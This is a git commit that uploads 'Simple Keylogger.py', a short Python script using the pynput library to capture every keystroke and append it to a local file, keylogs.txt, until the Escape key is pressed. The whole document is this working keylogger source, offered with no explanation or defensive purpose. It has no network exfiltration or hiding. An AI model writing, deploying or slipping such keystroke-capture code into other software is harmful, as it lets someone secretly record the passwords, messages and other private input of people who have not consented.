dd95f39c5118a5f12a163e4f21992ea947956840
Yousif Elalfy <yousif.alfy44@gmail.com>
2025-01-26 02:32:25 +0200

    Add files via upload

---
+++ Simple Keylogger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        with open("keylogs.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        with open("keylogs.txt", "a") as log_file:
+            log_file.write(f" {key} ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener if the escape key is pressed
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
